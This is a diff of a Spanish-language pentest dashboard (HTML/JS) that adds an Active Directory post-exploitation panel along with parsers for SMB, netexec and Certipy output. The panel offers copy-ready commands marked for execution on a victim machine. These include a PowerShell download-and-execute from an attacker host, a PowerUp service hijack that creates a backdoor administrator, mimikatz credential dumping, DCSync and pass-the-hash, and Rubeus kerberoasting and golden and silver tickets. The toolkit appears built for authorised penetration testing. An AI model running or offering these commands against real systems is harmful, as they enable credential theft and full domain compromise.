+    <button class="rbtn" id="ew-run" onclick="runTool('ew')">▶ CONECTAR</button>
+    <button class="sbtn" id="ew-stop" onclick="stopTool('ew')" disabled>■ STOP</button>
+    <button class="kbtn" onclick="cpCmd('ew-cmd')">COPY</button>
+  </div>
+  <div class="out-area" id="ew-out"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('ew-out')">CLEAR</button></div><div class="out-content" id="ew-out-c"></div></div>
+</div>
+
+<!-- ══ AD POST-EXPLOIT WINDOWS ══ -->
+<div id="p-ad-postex" class="panel">
+  <div class="pt">POST-EXPLOIT WIN <span class="ptd">— winPEAS, PowerUp, Seatbelt, Rubeus, mimikatz</span></div>
+
+  <!-- ── Servidor HTTP para entregar archivos ── -->
+  <div class="sdiv">SERVIDOR HTTP — entrega de binarios a la víctima</div>
+  <div class="row">
+    <div class="ig"><div class="lbl">ATTACKER IP</div><input class="fi" id="px-lh" placeholder="192.168.1.5" oninput="bPostex()"></div>
+    <div class="ig" style="max-width:72px"><div class="lbl">PUERTO</div><input class="fi" id="px-port" value="8080" oninput="bPostex()"></div>
+    <div class="ig w2"><div class="lbl">DIRECTORIO LOCAL (binarios Windows)</div><input class="fi" id="px-dir" value="/opt/post-exploit" oninput="bPostex()"></div>
+  </div>
+  <div class="cmd-preview"><div class="cmd-lbl">HTTP SERVER CMD</div><div class="cmd-text" id="px-srv-cmd"></div></div>
+  <div class="run-row">
+    <button class="rbtn" id="px-srv-run" onclick="runTool('px-srv')">▶ INICIAR SERVIDOR</button>
+    <button class="sbtn" id="px-srv-stop" onclick="stopTool('px-srv')" disabled>■ STOP</button>
+    <button class="kbtn" onclick="pxMkdir()">MKDIR DIR</button>
+    <button class="kbtn" onclick="pxDownloadAll()">⬇ DESCARGAR BINARIOS</button>
+  </div>
+  <div class="out-area" id="px-srv-out" style="margin-bottom:8px">
+    <div class="out-hdr"><span class="out-title">HTTP SERVER LOG</span><button class="kbtn" onclick="clrOut('px-srv-out')">CLEAR</button></div>
+    <div class="out-content" id="px-srv-out-c" style="max-height:70px"></div>
+  </div>
+
+  <!-- ── Tabs de herramientas ── -->
+  <div class="tabs">
+    <div class="tab on" onclick="stab('px','winpeas',this);bPostex()">WINPEAS</div>
+    <div class="tab" onclick="stab('px','powerup',this);bPostex()">POWERUP</div>
+    <div class="tab" onclick="stab('px','seatbelt',this);bPostex()">SEATBELT</div>
+    <div class="tab" onclick="stab('px','rubeus',this);bPostex()">RUBEUS</div>
+    <div class="tab" onclick="stab('px','mimi',this);bPostex()">MIMIKATZ</div>
+  </div>
+
+  <!-- WINPEAS -->
+  <div id="px-winpeas" class="tab-content on">
+    <div class="cmd-preview" style="margin-bottom:5px"><div class="cmd-lbl">DELIVERY (ejecutar en víctima)</div><div class="cmd-text" id="px-wp-cmd"></div></div>
+    <div class="plist" style="margin-top:4px">
+      <div class="pitem"><span class="ptxt">.\winPEASx64.exe</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\winPEASx64.exe quiet notcolor 2>&1 | Out-File C:\Users\Public\wp.txt</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\winPEASx64.exe systeminfo userinfo windowscreds</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\winPEASx64.exe -notcolor 2>&1 | findstr /i "pass\|cred\|vuln\|admin"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">powershell -ep bypass -c "IEX(IWR http://ATTACKER:PORT/winPEAS.ps1 -UseBasicParsing)"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+    </div>
+  </div>
+
+  <!-- POWERUP -->
+  <div id="px-powerup" class="tab-content">
+    <div class="cmd-preview" style="margin-bottom:5px"><div class="cmd-lbl">DELIVERY (ejecutar en víctima)</div><div class="cmd-text" id="px-pu-cmd"></div></div>
+    <div class="plist" style="margin-top:4px">
+      <div class="pitem"><span class="ptxt">powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">powershell -ep bypass -c ". .\PowerUp.ps1; Get-ModifiableServiceFile"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">powershell -ep bypass -c ". .\PowerUp.ps1; Find-ProcessDLLHijack"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">powershell -ep bypass -c ". .\PowerUp.ps1; Get-UnquotedService"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">powershell -ep bypass -c ". .\PowerUp.ps1; Write-ServiceBinary -Name 'VulnSvc' -Command 'net user pwn P@ss /add && net localgroup Administrators pwn /add'"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+    </div>
+  </div>
+
+  <!-- SEATBELT -->
+  <div id="px-seatbelt" class="tab-content">
+    <div class="cmd-preview" style="margin-bottom:5px"><div class="cmd-lbl">DELIVERY (ejecutar en víctima)</div><div class="cmd-text" id="px-sb-cmd"></div></div>
+    <div class="plist" style="margin-top:4px">
+      <div class="pitem"><span class="ptxt">.\Seatbelt.exe -group=all</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Seatbelt.exe -group=user</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Seatbelt.exe -group=system</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Seatbelt.exe TokenPrivileges ProcessCreationEvents PowerShell CredGuard LSASettings</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Seatbelt.exe -group=remote</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Seatbelt.exe WindowsCredentialFiles KeePass MasterKeys DPAPI</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+    </div>
+  </div>
+
+  <!-- RUBEUS -->
+  <div id="px-rubeus" class="tab-content">
+    <div class="cmd-preview" style="margin-bottom:5px"><div class="cmd-lbl">DELIVERY (ejecutar en víctima)</div><div class="cmd-text" id="px-rb-cmd"></div></div>
+    <div class="plist" style="margin-top:4px">
+      <div class="pitem"><span class="ptxt">.\Rubeus.exe kerberoast /outfile:hashes.txt</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Rubeus.exe asreproast /outfile:asrep.txt</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Rubeus.exe dump /luid:0x3e4 /nowrap</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Rubeus.exe tgtdeleg /nowrap</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Rubeus.exe s4u /user:SVC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/DC.DOMAIN.LOCAL /ptt</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /user:Administrator /ptt</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Rubeus.exe silver /rc4:SERVICE_HASH /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /user:Administrator /service:cifs/HOST /ptt</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\Rubeus.exe klist</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+    </div>
+  </div>
+
+  <!-- MIMIKATZ -->
+  <div id="px-mimi" class="tab-content">
+    <div class="cmd-preview" style="margin-bottom:5px"><div class="cmd-lbl">DELIVERY (ejecutar en víctima)</div><div class="cmd-text" id="px-mm-cmd"></div></div>
+    <div class="plist" style="margin-top:4px">
+      <div class="pitem"><span class="ptxt">.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:DOMAIN\krbtgt" "exit"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe" "exit"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:HASH /ptt" "exit"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv" "exit"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+      <div class="pitem"><span class="ptxt">Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
+    </div>
+  </div>
 </div>
 
 <!-- ══ TCPDUMP ══ -->
@@ -2862,13 +3335,17 @@ textarea.fi{resize:vertical;min-height:48px}
 
 <!-- ══ TOOLS STATUS ══ -->
 <div id="p-tools" class="panel">
-  <div class="pt">HERRAMIENTAS <span class="ptd">— Estado en tu Kali</span></div>
+  <div class="pt">HERRAMIENTAS <span class="ptd">— Estado e instalación</span></div>
   <div class="run-row" style="margin-bottom:10px">
     <button class="rbtn" onclick="checkTools()">▶ VERIFICAR TODO</button>
-    <button class="kbtn" onclick="execAndCopy2('apt install -y nmap gobuster ffuf nikto wpscan hydra john hashcat sqlmap medusa wfuzz')">INSTALAR BÁSICAS</button>
-    <button class="kbtn" onclick="execAndCopy2('apt install -y crackmapexec smbmap responder bloodhound neo4j aircrack-ng tcpdump')">INSTALAR AD/WIRELESS</button>
+    <button class="kbtn" onclick="execAndCopy2('apt install -y nmap gobuster ffuf nikto wpscan hydra john hashcat sqlmap medusa wfuzz')">APT BÁSICAS</button>
+    <button class="kbtn" onclick="execAndCopy2('apt install -y netexec smbmap smbclient enum4linux-ng ldap-utils responder bloodhound-python3 neo4j tcpdump aircrack-ng kerbrute')">APT AD</button>
+    <button class="kbtn" onclick="pipInstallAllAD()">PIP AD TOOLS</button>
   </div>
-  <div class="tool-grid" id="tools-grid"><div style="color:var(--mut);font-size:14px">Click "Verificar Todo" para revisar herramientas instaladas.</div></div>
+  <div class="sdiv">ESTADO DE HERRAMIENTAS</div>
+  <div class="tool-grid" id="tools-grid"><div style="color:var(--mut);font-size:13px">Click "Verificar Todo" para revisar.</div></div>
+  <div class="sdiv" style="margin-top:12px">HERRAMIENTAS AD AVANZADAS — instalación individual</div>
+  <div id="ad-tools-install" class="tool-grid" style="grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:5px"></div>
 </div>
 
 <!-- ══ FILES ══ -->
@@ -3726,6 +4203,10 @@ function sw(id, el) {
   }
   updateRightPanel(id);
   try { localStorage.setItem('x9panel', id); } catch(_) {}
+  // trigger tool checks for AD panels
+  if (typeof PANEL_TOOL_MAP !== 'undefined' && PANEL_TOOL_MAP[id]) checkPanelTools(id);
+  if (id === 'tools' && typeof renderAdInstallGrid !== 'undefined') { checkTools(); setTimeout(renderAdInstallGrid, 300); }
+  if (id === 'ad-postex') setTimeout(bPostex, 50);
 }
 function updateRightPanel(id) {
   const term = document.getElementById('term-panel');
@@ -4680,35 +5161,273 @@ parsers.ss = r => {
   return o;
 };
 
-/* SMBMAP */
+/* SMB ACCESS — smbmap + crackmapexec / netexec */
 parsers.sm = r => {
-  // smbmap output: lines like "    Share Name                                  READ, WRITE    comment"
-  // The share table starts after a "[+] IP:" header line and ends at blank or next header.
-  // We parse only lines that match the share table format: indented name (may have spaces),
-  // followed by a known permission token. We skip directory listing lines (contain dates like 02/08/2025).
-  const PERMS_RE = /\b(READ,\s*WRITE|READ ONLY|READ|WRITE|NO ACCESS)\b/i;
+  const L = r.split('\n');
+  const e = ph.esc;
+
+  // ── Tool detection: CME/netexec lines start "SMB  IP  PORT  HOST  " ──
+  const isCme = L.some(l => /^SMB\s+[\d.]+\s+\d+\s+\S+\s/i.test(l));
+
+  if (isCme) {
+    const strip   = l => l.replace(/^SMB\s+[\d.]+\s+\d+\s+\S+\s+/i, '').trim();
+    const getIp   = l => (l.match(/^SMB\s+([\d.]+)/i)          || [])[1] || '';
+    const getHost = l => (l.match(/^SMB\s+[\d.]+\s+\d+\s+(\S+)/i) || [])[1] || '';
+
+    // ── 1. Host metadata ──────────────────────────────────────────────
+    const hostMap = {};
+    for (const l of L) {
+      if (!/^SMB\s+/i.test(l)) continue;
+      const c = strip(l);
+      if (!/^\[\*\]/.test(c)) continue;
+      const clean  = c.slice(4).trim();
+      const nameM  = clean.match(/\(name:([^)]+)\)/i);
+      const domM   = clean.match(/\(domain:([^)]+)\)/i);
+      if (!nameM && !domM) continue;
+      const signM  = clean.match(/\(signing:([^)]+)\)/i);
+      const smbv1M = clean.match(/\(SMBv1:([^)]+)\)/i);
+      const osM    = clean.match(/^(Windows\s*[^(]+)/i);
+      const ip     = getIp(l);
+      hostMap[ip]  = {
+        ip,
+        name:    nameM  ? nameM[1].trim()  : '',
+        domain:  domM   ? domM[1].trim()   : '',
+        os:      osM    ? osM[1].trim()    : '',
+        signing: signM  ? signM[1].trim()  : '',
+        smbv1:   smbv1M ? smbv1M[1].trim() : '',
+      };
+    }
+    const hosts = Object.values(hostMap);
+
+    // ── 2. Auth results (per credential line) ─────────────────────────
+    // [+] domain\user:pass (Pwn3d!)  →  admin
+    // [+] domain\user:pass           →  success
+    // [-] domain\user:pass STATUS_X  →  fail
+    const authAdmin   = [];
+    const authSuccess = [];
+    const authFail    = [];
+    for (const l of L) {
+      if (!/^SMB\s+/i.test(l)) continue;
+      const c    = strip(l);
+      const ip   = getIp(l);
+      const host = getHost(l);
+      if (/^\[\+\]/.test(c)) {
+        if (!/[\w.-]+(\\|@)[\w.-]+:/.test(c)) continue; // skip enumeration headers
+        const credM = c.match(/^\[\+\]\s+([\w.\\@-]+:[^\s(]+)/);
+        const cred  = credM ? credM[1] : c.replace(/^\[\+\]\s*/,'').slice(0,60);
+        if (/Pwn3d!/i.test(c))
+          authAdmin.push({ ip, host, cred });
+        else
+          authSuccess.push({ ip, host, cred });
+      } else if (/^\[-\]/.test(c)) {
+        const reasonM = c.match(/(STATUS_\w+|WRONG_PASSWORD)/i);
+        const credM   = c.match(/^\[-\]\s+([\w.\\@-]+:[^\s]+)/);
+        authFail.push({ ip, host, cred: credM ? credM[1] : c.replace(/^\[-\]\s*/,'').slice(0,50), reason: reasonM ? reasonM[1] : 'FAILED' });
+      }
+    }
+
+    // ── 3. Shares ─────────────────────────────────────────────────────
+    const PERM_RE = /\b(READ,?\s*WRITE|READ ONLY|READ|WRITE|NO ACCESS)\b/i;
+    const shares = [];
+    for (const l of L) {
+      if (!/^SMB\s+/i.test(l)) continue;
+      const c = strip(l);
+      if (/^\[|\bShare\b|\bDisk\b|^-+/i.test(c.trim())) continue;
+      const pm = c.match(PERM_RE);
+      if (!pm) continue;
+      const pi = c.indexOf(pm[0]);
+      const nm = c.slice(0, pi).trim();
+      if (!nm || nm.length < 2) continue;
+      const perm    = pm[0].replace(/\s*,\s*/g, ',').toUpperCase();
+      const comment = c.slice(pi + pm[0].length).trim();
+      shares.push([
+        e(nm),
+        perm.includes('WRITE') ? ph.pill(perm,'crit') : perm.includes('READ') ? ph.pill(perm,'warn') : ph.pill(perm,'ok'),
+        e(comment)
+      ]);
+    }
+
+    // ── 4. Users ──────────────────────────────────────────────────────
+    // netexec --users emits two different formats:
+    //   [+] Enumerated users  →  Username  RID
+    //   [*] Enumerated N local users: DOMAIN  →  -Username-  -Last PW Set-  -BadPW-  -Description-
+    const users = []; let inUsers = false; let userHasPwSet = false;
+    for (const l of L) {
+      if (!/^SMB\s+/i.test(l)) continue;
+      const c = strip(l);
+      if (/\[[\+\*]\].*Enumerat.*user/i.test(c)) { inUsers = true; continue; }
+      if (!inUsers) continue;
+      if (/^\[[\+\*\-!]/.test(c)) { inUsers = false; continue; }
+      if (/^-+/.test(c)) { userHasPwSet = true; continue; } // header "-Username- -Last PW Set-..."
+      if (/^Username\s+RID/i.test(c)) continue;
+      const pts = c.trim().split(/\s{2,}/);
+      if (!pts[0] || pts[0].length < 1) continue;
+      users.push([e(pts[0]), e(pts[1] || ''), e(pts[2] || ''), e(pts[3] || '')]);
+    }
+
+    // ── 5. Groups ─────────────────────────────────────────────────────
+    const groups = []; let inGroups = false;
+    for (const l of L) {
+      if (!/^SMB\s+/i.test(l)) continue;
+      const c = strip(l);
+      if (/\[\+\].*Enumerat.*group/i.test(c)) { inGroups = true; continue; }
+      if (!inGroups) continue;
+      if (/^\[/.test(c)) { inGroups = false; continue; }
+      if (/^-+|Group Name/i.test(c)) continue;
+      const pts = c.trim().split(/\s{2,}/);
+      if (pts[0] && pts[0].length > 1) groups.push([e(pts[0]), e(pts[1] || ''), e(pts[2] || '')]);
+    }
+
+    // ── 6. Logged-on ──────────────────────────────────────────────────
+    const loggedOn = []; let inLogged = false;
+    for (const l of L) {
+      if (!/^SMB\s+/i.test(l)) continue;
+      const c = strip(l);
+      if (/\[\+\].*loggedon/i.test(c)) { inLogged = true; continue; }
+      if (!inLogged) continue;
+      if (/^\[/.test(c)) { inLogged = false; continue; }
+      if (/^-+|Username\s+From/i.test(c)) continue;
+      const t = c.trim(); if (t) loggedOn.push(t);
+    }
+
+    // ── 7. Password policy ────────────────────────────────────────────
+    const passPol = []; let inPol = false;
+    for (const l of L) {
+      if (!/^SMB\s+/i.test(l)) continue;
+      const c = strip(l);
+      if (/\[\+\].*[Pp]ass.*[Pp]olic|Dumping password/i.test(c)) { inPol = true; continue; }
+      if (!inPol) continue;
+      if (/^\[/.test(c) && !/minimum|maximum|lockout|complex|length|reset|history|enforce/i.test(c)) { inPol = false; continue; }
+      const pm = c.match(/^(.+?):\s*(.+)$/);
+      if (pm) passPol.push([e(pm[1].trim()), e(pm[2].trim())]);
+    }
+
+    // ── 8. RID brute ──────────────────────────────────────────────────
+    const ridRows = [];
+    for (const l of L) {
+      if (!/^SMB\s+/i.test(l)) continue;
+      const rm = strip(l).match(/^(\d+):\s*([\w\\.@-]+)\s+\((\w+)\)/);
+      if (rm) ridRows.push([e(rm[1]), e(rm[2]), e(rm[3])]);
+    }
+
+    // ── RENDER ────────────────────────────────────────────────────────
+    let o = ph.sum([
+      authAdmin.length   ? ph.pill('⚡ '+authAdmin.length+' ADMIN (Pwn3d!)', 'crit') : '',
+      authSuccess.length ? ph.pill(authSuccess.length+' login OK',           'ok')   : '',
+      authFail.length    ? ph.pill(authFail.length+' FAILED',                'warn') : '',
+      !authAdmin.length && !authSuccess.length && !authFail.length ? ph.pill('sin respuesta auth','info') : '',
+      shares.length   ? ph.pill(shares.length  +' shares',   'warn') : '',
+      users.length    ? ph.pill(users.length   +' usuarios', 'info') : '',
+      groups.length   ? ph.pill(groups.length  +' grupos',   'info') : '',
+      ridRows.length  ? ph.pill(ridRows.length +' RIDs',     'info') : '',
+      loggedOn.length ? ph.pill(loggedOn.length+' logged',   'info') : '',
+      passPol.length  ? ph.pill('pass-pol',                  'info') : '',
+    ]);
+
+    // Admin access banner — primera sección, muy visible
+    if (authAdmin.length) {
+      const body = authAdmin.map(a =>
+        ph.find(
+          `<span style="color:var(--g);font-weight:700;letter-spacing:1px">⚡ ADMIN</span>` +
+          `&nbsp;&nbsp;<span style="color:var(--mut);font-size:11px">${e(a.ip)} &nbsp; ${e(a.host)}</span>` +
+          `&nbsp;&nbsp;<span style="color:var(--txt)">${e(a.cred)}</span>` +
+          `&nbsp;&nbsp;` + ph.pill('Pwn3d!','crit'),
+          'crit'
+        )
+      ).join('');
+      o += ph.sec('Acceso Administrativo Confirmado', body);
+    }
+
+    // Auth success (no admin)
+    if (authSuccess.length) {
+      const rows = authSuccess.map(a => [e(a.ip), e(a.host), e(a.cred), ph.pill('SUCCESS','ok')]);
+      o += ph.sec('Autenticación Exitosa ('+authSuccess.length+')', ph.tbl(['IP','HOST','CREDENCIAL','RESULTADO'], rows));
+    }
+
+    // Auth failures — máximo 6, luego contador
+    if (authFail.length) {
+      const show = authFail.slice(0,6);
+      const more = authFail.length - show.length;
+      const rows = show.map(a => [e(a.ip), e(a.host), e(a.cred), ph.pill(a.reason,'warn')]);
+      let body = ph.tbl(['IP','HOST','CREDENCIAL','MOTIVO'], rows);
+      if (more > 0) body += ph.find('... y '+more+' intentos fallidos más', 'info');
+      o += ph.sec('Autenticación Fallida ('+authFail.length+')', body);
+    }
+
+    // Host info
+    if (hosts.length) {
+      const hiRows = hosts.map(h => [e(h.ip), e(h.name), e(h.domain), e(h.os.replace(/\s+$/,'').slice(0,45)||'—')]);
+      o += ph.sec('Host', ph.tbl(['IP','HOSTNAME','DOMINIO','SISTEMA OPERATIVO'], hiRows));
+    }
+
+    // SMB security
+    if (hosts.length) {
+      const ssRows = hosts.map(h => [
+        e(h.ip), e(h.name),
+        h.signing === 'True'  ? ph.pill('True','warn')  : h.signing === 'False' ? ph.pill('False','ok')  : ph.pill(h.signing||'—','info'),
+        h.smbv1   === 'True'  ? ph.pill('True','crit')  : h.smbv1   === 'False' ? ph.pill('False','ok') : ph.pill(h.smbv1||'—','info'),
+      ]);
+      o += ph.sec('Seguridad SMB', ph.tbl(['IP','HOSTNAME','SMB SIGNING','SMBv1'], ssRows));
+    }
+
+    // Enumeration
+    if (shares.length)   o += ph.sec('Shares ('+shares.length+')', ph.tbl(['SHARE','PERMISOS','COMMENT'], shares));
+    if (users.length) {
+      const uHdrs = userHasPwSet ? ['USUARIO','ÚLTIMO CAMBIO PW','BAD PW','DESCRIPCIÓN'] : ['USUARIO','RID'];
+      const uRows = userHasPwSet ? users : users.map(u => [u[0], u[1]]);
+      o += ph.sec('Usuarios enumerados ('+users.length+')', ph.tbl(uHdrs, uRows));
+    }
+    if (groups.length)   o += ph.sec('Grupos ('+groups.length+')', ph.tbl(['GRUPO','MIEMBROS','COMENTARIO'], groups));
+    if (loggedOn.length) o += ph.sec('Logged-on users ('+loggedOn.length+')', loggedOn.map(u => ph.find(e(u),'info')).join(''));
+    if (passPol.length)  o += ph.sec('Password Policy', ph.tbl(['PARÁMETRO','VALOR'], passPol));
+    if (ridRows.length)  o += ph.sec('RID Brute ('+ridRows.length+')', ph.tbl(['RID','CUENTA','TIPO'], ridRows));
+
+    if (!hosts.length && !authAdmin.length && !authSuccess.length && !authFail.length && !shares.length)
+      o += ph.empty('Sin resultados SMB reconocibles. Verifica credenciales y módulos usados.');
+    return o;
+  }
+
+  // ── smbmap ──────────────────────────────────────────────────────────────
   const DATE_RE  = /\d{2}\/\d{2}\/\d{4}/;
+  const PERMS_RE = /\b(READ,\s*WRITE|READ ONLY|READ|WRITE|NO ACCESS)\b/i;
+
+  const authErr = L.filter(l => /\[!\]|Authentication error|SessionError|STATUS_LOGON_FAILURE/i.test(l));
+  const authOk  = L.filter(l => /\[\+\]/.test(l) && /[\d.]{7,}/.test(l));
+  const ipM     = r.match(/\[[\+\*!]\]\s+([\d.]+)/);
+  const domM    = r.match(/\(([^)]+\\[^)]+)\)/);
+
   const shares = [];
-  for (const l of r.split('\n')) {
-    if (DATE_RE.test(l)) continue; // skip dir listing lines
+  for (const l of L) {
+    if (DATE_RE.test(l)) continue;
     const pm = l.match(PERMS_RE);
     if (!pm) continue;
-    const permIdx = l.indexOf(pm[0]);
-    const namePart = l.slice(0, permIdx).trim();
-    if (!namePart || namePart.length < 2) continue;
-    // skip header/separator lines
-    if (/Disk|Permissions|---/.test(namePart) && namePart.split(/\s+/).length <= 2) continue;
-    const perm = pm[0].replace(/\s*,\s*/g, ',').toUpperCase();
-    const afterPerm = l.slice(permIdx + pm[0].length).trim();
+    const pi = l.indexOf(pm[0]);
+    const nm = l.slice(0, pi).trim();
+    if (!nm || nm.length < 2) continue;
+    if (/^Disk|^Permissions|^Share|^---/i.test(nm)) continue;
+    const perm    = pm[0].replace(/\s*,\s*/g, ',').toUpperCase();
+    const comment = l.slice(pi + pm[0].length).trim();
     shares.push([
-      ph.esc(namePart),
+      e(nm),
       perm.includes('WRITE') ? ph.pill(perm,'crit') : perm.includes('READ') ? ph.pill(perm,'warn') : ph.pill(perm,'ok'),
-      ph.esc(afterPerm)
+      e(comment)
     ]);
   }
-  const ipM = r.match(/\[[\+\*]\]\s+([\d.]+)/);
-  let o = ph.sum([ipM ? ph.pill(ipM[1],'info') : '', ph.pill(shares.length+' shares', shares.length>0?'warn':'ok')]);
-  o += shares.length ? ph.sec('SMB Shares', ph.tbl(['SHARE','PERMISOS','COMMENT'], shares)) : ph.empty('Sin shares accesibles o formato no reconocido.');
+
+  const isFailure = authErr.some(l => /STATUS_LOGON_FAILURE|Authentication error/i.test(l));
+  const authLabel = isFailure ? 'Login fallido' : authOk.length ? 'Login OK' : 'sin respuesta auth';
+  const authCl    = isFailure ? 'warn' : authOk.length ? 'ok' : 'info';
+
+  let o = ph.sum([
+    ipM  ? ph.pill(ipM[1],      'info') : '',
+    domM ? ph.pill(e(domM[1]),  'info') : '',
+    ph.pill(authLabel, authCl),
+    ph.pill(shares.length+' shares', shares.length > 0 ? 'warn' : 'ok'),
+  ]);
+
+  if (authErr.length) o += ph.sec('Errores de autenticación', authErr.slice(0,5).map(l => ph.find(e(l.trim()),'warn')).join(''));
+  if (shares.length)  o += ph.sec('SMB Shares ('+shares.length+')', ph.tbl(['SHARE','PERMISOS','COMMENT'], shares));
+  if (!shares.length && !isFailure) o += ph.empty('Sin shares accesibles. Verifica credenciales o prueba null session (-u "" -p "").');
   return o;
 };
 
@@ -4846,6 +5565,312 @@ parsers.bh = r => {
   else o+=ph.sec('Objetos AD recolectados',Object.entries(obj).filter(([,v])=>v>0).map(([k,v])=>ph.find(`<b>${k}</b>: ${v}`,'info')).join(''));
   return o;
 };
+
+/* ── ADCS / Certipy ──────────────────────────────────────── */
+
+// Toggles an ADCS detail section and flips the ▸/▾ arrow on its pill
+function adcToggle(id) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  const opening = el.style.display === 'none';
+  el.style.display = opening ? 'block' : 'none';
+  document.querySelectorAll(`[data-adctgl="${id}"]`).forEach(p => {
+    const lbl = p.getAttribute('data-adclbl') || '';
+    p.textContent = (opening ? '▾ ' : '▸ ') + lbl;
+  });
+}
+
+parsers.adc = r => {
+  const L = r.trim().split('\n');
+
+  // ── Numeric counters ──────────────────────────────────────
+  const grab = pat => { const m = r.match(pat); return m ? parseInt(m[1]) : null; };
+  const nTemplates = grab(/Found (\d+) certificate templates?/i);
+  const nEnabled   = grab(/Found (\d+) enabled certificate templates?/i);
+  const nCAs       = grab(/Found (\d+) certificate authorit/i);
+  const nIssuance  = grab(/Found (\d+) issuance polic/i);
+  const nOIDs      = grab(/Found (\d+) OIDs?/i);
+
+  // ── CA config results ─────────────────────────────────────
+  const caOk   = [...r.matchAll(/Successfully retrieved CA configuration for '?([^'\n,]+?)(?:'|$)/gi)].map(m => m[1].trim());
+  const caFail = [...r.matchAll(/Could not retrieve.*?(?:configuration for|for) '?([^'\n,]+?)(?:'|\s|$)/gi)].map(m => m[1].trim());
+
+  // ── Web enrollment ────────────────────────────────────────
+  const webActive  = [...r.matchAll(/Web Enrollment.*?(?:Enabled|Active|Available)/gi)].map(m => m[0]);
+  const webRefused = [...r.matchAll(/(?:Connection refused|web enrollment.*?(?:refused|not available|failed))[^\n]*/gi)].map(m => m[0].trim());
+
+  // ── DNS / RRP errors ─────────────────────────────────────
+  const dnsErrors = [...r.matchAll(/DNS.*?(?:failed|resolution failed)[^\n]*?'?([\w.:-]+)'?/gi)].map(m => m[1]);
+  const rrpFail   = [...r.matchAll(/(?:RRP|remote registry)[^\n]*failed[^\n]*/gi)].map(m => m[0].trim());
+
+  // ── ESC findings (from stdout) ────────────────────────────
+  const escRows  = [];
+  const vulnMark = [];
+  for (const l of L) {
+    const em = l.match(/\b(ESC\d+)\b.*?:\s*(.+)/i);
+    if (em) { escRows.push([`<span style="color:var(--red);font-weight:600">${ph.esc(em[1])}</span>`, ph.esc(em[2].trim())]); continue; }
+    if (/\[!\].*(?:Vulnerable|ESC)/i.test(l)) vulnMark.push(ph.esc(l.replace(/^\s*\[!\]\s*/,'').trim()));
+  }
+
+  // ── Saved files ───────────────────────────────────────────
+  const savedJSON = r.match(/Saved.*?'([\w\-_. ]+\.json)'/i)?.[1] || '';
+  const savedTXT  = r.match(/Saved.*?'([\w\-_. ]+\.txt)'/i)?.[1]  || '';
+  const savedZIP  = r.match(/Saved BloodHound[^\n]*?'([^']+\.zip)'/i)?.[1] || '';
+
+  const hasVulns = escRows.length > 0 || vulnMark.length > 0;
+  const hasCA    = caOk.length + caFail.length > 0;
+  const hasDNS   = dnsErrors.length > 0 || rrpFail.length > 0;
+  const hasFiles = !!(savedJSON || savedTXT || savedZIP);
+
+  // ── Toggle-pill helper ────────────────────────────────────
+  // active=false → greyed-out static pill (nothing to show)
